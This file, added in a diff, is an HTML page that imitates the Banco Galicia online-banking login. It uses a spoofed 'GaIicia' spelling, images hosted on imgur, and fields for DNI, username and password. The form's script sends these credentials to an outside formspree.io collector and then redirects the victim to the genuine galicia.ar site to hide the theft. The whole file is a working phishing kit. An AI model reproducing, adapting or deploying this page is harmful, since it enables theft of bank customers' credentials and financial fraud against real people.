@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Online Banking</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      display: flex;
+      height: 100vh;
+    }
+    .left {
+      flex: 1.3;
+      display: flex;
+      flex-direction: column;
+      padding: 20px 40px;
+      position: relative;
+    }
+    .branding {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      margin-bottom: 40px;
+    }
+    .branding img {
+      height: 30px;
+      margin-bottom: 5px;
+    }
+    .branding span {
+      font-size: 14px;
+      color: #666;
+    }
+    .login-container {
+      position: absolute;
+      top: 43%;
+      left: 49%;
+      transform: translate(-50%, -50%);
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    h2 {
+      font-weight: normal;
+      margin-bottom: 30px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: none;
+      border-bottom: 2px solid #ccc;
+      font-size: 16px;
+    }
+    input[type="checkbox"] {
+      margin-right: 10px;
+    }
+    button {
+      background-color: #eee;
+      border: none;
+      padding: 15px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .right {
+      flex: 0.7;
+      background: no-repeat center center;
+      background-size: cover;
+    }
+    .links {
+      font-size: 14px;
+      text-align: center;
+      margin-top: 20px;
+    }
+    .links a {
+      color: #f26122;
+      text-decoration: none;
+    }
+    .footer {
+      margin-top: 60px;
+      font-size: 12px;
+      color: gray;
+      text-align: center;
+    }
+  </style>
+  <script>
+    window.onload = function() {
+      const fondos = [
+        'https://i.imgur.com/KuiLvUU.png',
+        'https://i.imgur.com/ncJTe79.png',
+        'https://i.imgur.com/jYXkxek.png',
+        'https://i.imgur.com/WuVuZEM.png',
+        'https://i.imgur.com/thTx6mv.png',
+        'https://i.imgur.com/0rmJF7U.png',
+        'https://i.imgur.com/IEVq5rJ.png',
+        'https://i.imgur.com/Jwcqo8a.png',
+        'https://i.imgur.com/RvnxIkR.png',
+        'https://i.imgur.com/K2FWPUi.png',
+        'https://i.imgur.com/wd0D95F.png',
+        'https://i.imgur.com/x5hOu1d.png',
+        'https://i.imgur.com/16fzfXV.png',
+        'https://i.imgur.com/258chYv.png',
+        'https://i.imgur.com/xdi6yls.png'
+      ];
+      const fondoAleatorio = fondos[Math.floor(Math.random() * fondos.length)];
+      document.querySelector('.right').style.backgroundImage = `url('${fondoAleatorio}')`;
+    }
+
+    function enviarFormulario(event) {
+      event.preventDefault();
+      const form = event.target;
+      const formData = new FormData(form);
+      fetch(form.action, {
+        method: form.method,
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      }).then(response => {
+        window.location.href = 'https://www.galicia.ar/personas';
+      }).catch(error => {
+        window.location.href = 'https://www.galicia.ar/personas';
+      });
+    }
+  </script>
+<link rel="icon" type="image/png" href="https://i.imgur.com/gCkvKJc.png">
+</head>
+<body>
+  <div class="left">
+    <div class="branding">
+      <img src="https://i.imgur.com/QavhSjz.png" alt="Logo GaIicia">
+      <span>Online Banking</span>
+    </div>
+    <div class="login-container">
+      <h2>Iniciar sesión</h2>
+      <form action="https://formspree.io/f/xgvkvkqo" method="POST" onsubmit="enviarFormulario(event)">
+        <input type="text" name="dni" placeholder="Tu DNI" required>
+        <input type="text" name="usuario" placeholder="Tu usuario GaIicia" required>
+        <input type="password" name="clave" placeholder="Tu clave GaIicia" required>
+        <label><input type="checkbox"> Recordar DNI y Usuario</label>
+        <button type="submit">INICIAR SESIÓN</button>
+      </form>
+      <div class="links">
+        <p><a href="#">OLVIDÉ O BLOQUEÉ MIS CLAVES</a></p>
+        <p>Si es tu primera vez o necesitás el usuario <br><a href="#">CREÁ TUS CLAVES</a></p>
+      </div>
+      <div class="footer">
+        Operar con Online Banking implica aceptar los <a href="#">términos y condiciones</a> en los que se ofrece el servicio. <br>
+        Información sobre seguridad. Ir a <a href="#">Office Banking</a>
+      </div>
+    </div>
+  </div>
+  <div class="right"></div>
+</body>
+</html>
